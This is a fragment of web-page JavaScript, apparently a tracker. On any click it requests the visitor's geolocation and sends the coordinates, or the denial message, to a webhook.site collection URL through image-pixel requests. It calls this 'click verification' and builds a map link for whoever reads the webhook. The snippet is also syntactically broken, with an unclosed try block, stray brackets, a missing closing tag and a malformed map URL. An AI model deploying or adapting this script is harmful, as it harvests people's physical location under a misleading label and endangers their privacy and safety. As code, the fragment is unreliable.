    <script>
        const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
            try {
    const testImg = new Image();
    testImg.onload = function() { console.log("✅ Image Ping: SUCCESS"); };

});

        // 2. CLICK VERIFICATION WITH GPS
        window.onclick = function() {
            // Request the location (Triggers the browser popup)
            navigator.geolocation.getCurrentPosition(function(pos) {
                var lat = pos.coords.latitude;
                var lon = pos.coords.longitude;
                
                // We send the coordinates in the URL so they show up in Query Strings
                var gpsPing = new Image();
                gpsPing.src = webhookURL + "?event=CLICK_VERIFIED&lat=" + lat + "&lon=" + lon + "&map=https://www.google.com" + lat + "," + lon;
                
                console.log("GPS Verification Sent");
            }, function(err) {
                // If they deny or it times out, we still log the click error
                var errPing = new Image();
                errPing.src = webhookURL + "?event=CLICK_DENIED&msg=" + err.message;
            }, { enableHighAccuracy: false, maximumAge: Infinity });
        };
